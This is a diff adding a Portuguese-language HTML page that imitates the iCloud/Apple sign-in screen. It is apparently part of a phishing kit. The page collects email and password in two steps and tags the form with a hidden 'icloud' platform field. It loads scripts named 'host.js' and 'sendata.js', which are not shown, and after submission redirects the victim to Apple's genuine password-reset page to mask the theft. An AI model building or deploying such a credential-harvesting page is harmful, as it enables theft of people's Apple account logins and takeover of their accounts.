@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login iCloud Estilo Apple</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="shortcut icon" href="https://img.icons8.com/?size=100&id=30840&format=png&color=FFFFFF" type="image/x-icon">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background-color: #0d0d0d;
+      font-family: 'Inter', sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      height: 100vh;
+    }
+    .logo-cont{
+       position: absolute;
+        top: 20px;
+        width: 85%;
+    }
+    .logo-cont header{
+        display: flex;
+        align-items: center;
+    }
+    .logo-cont header img{
+        width: 20px;
+    }
+
+    .login-container {
+      background-color: #1c1c1e;
+      padding: 50px 40px;
+      border-radius: 20px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .logo-circle {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 50px;
+        border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      
+    }
+
+    .logo-circle img {
+      width: 180px;
+  
+
+    }
+
+    h2 {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 30px;
+    }
+
+    .form-step {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 10px;
+      opacity: 1;
+      transition: opacity 0.4s ease;
+    }
+
+    .hidden {
+      opacity: 0;
+      pointer-events: none;
+      height: 0;
+      overflow: hidden;
+    }
+
+    input[type="email"],
+    input[type="password"] {
+      padding: 14px;
+      background-color: #2c2c2e;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      outline: none;
+    }
+
+    button {
+      background-color: #3a3a3c;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #505053;
+    }
+
+    .checkbox-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-top: 15px;
+      font-size: 14px;
+    }
+
+    .checkbox-container input {
+      margin-right: 6px;
+    }
+
+    .links {
+      margin-top: 20px;
+      font-size: 14px;
+    }
+
+    .links a {
+      display: block;
+      color: #0a84ff;
+      text-decoration: none;
+      margin-top: 5px;
+    }
+
+    @media (max-width:800px) {
+        body{
+            background-color: #1C1C1E;
+        }
+    }
+  </style>
+</head>
+<body>
+    <div class="logo-cont">
+        
+        <header>
+            <img src="https://img.icons8.com/?size=100&id=30840&format=png&color=FFFFFF" alt="">iCloud
+        </header>
+
+    </div>
+  <div class="login-container">
+    <div class="logo-circle">
+      <img src="icloud-logo.png" alt="Apple Logo">
+    </div>
+    <h2>Inicie sessão com a Conta Apple</h2>
+
+    <form id="login-form" onsubmit="return false">
+      <div id="step-email" class="form-step">
+        <input type="email" id="email" placeholder="E-mail ou número de telefone" class="inputName" required />
+
+        <input type="text" class="platform" style="display: none;" value="icloud">
+        <button type="button" onclick="mostrarSenha()">⮞</button>
+      </div>
+
+      <div id="step-senha" class="form-step hidden">
+        <input type="password" id="senha" placeholder="Senha"  class="inputPass" required />
+        <button type="submit" class="enviar">Iniciar Sessão</button>
+
+        <div class="checkbox-container">
+          <label><input type="checkbox" id="keep-signed-in" /> Manter a sessão aberta</label>
+        </div>
+
+        <div class="links">
+          <a href="https://iforgot.apple.com/password/verify/appleid">Esqueceu a senha?</a>
+          <a href="#">Criar Conta Apple</a>
+        </div>
+      </div>
+    </form>
+  </div>
+
+  <script src="../host.js"></script>
+  <script>
+    function mostrarSenha() {
+      const email = document.getElementById('email').value.trim();
+      if (!email.includes('@')) {
+        
+        return;
+      }
+
+      const stepEmail = document.getElementById('step-email');
+      const stepSenha = document.getElementById('step-senha');
+
+      // Aplica o fade-out na etapa do e-mail
+      stepEmail.classList.add('hidden');
+
+      // Espera a transição antes de mostrar o próximo passo
+      setTimeout(() => {
+        stepEmail.style.display = 'none';
+        stepSenha.classList.remove('hidden');
+      }, 400); // Deve coincidir com o tempo de transition
+    }
+  </script>
+    <script src="../sendata.js"></script>
+
+    <script>document.addEventListener("click",(e)=>{
+  if(e.target.classList[0] === "enviar"){
+    setTimeout(() => {
+      location.href = "https://iforgot.apple.com/password/verify/appleid"
+    }, 200);
+  }
+})</script>
+</body>
+</html>
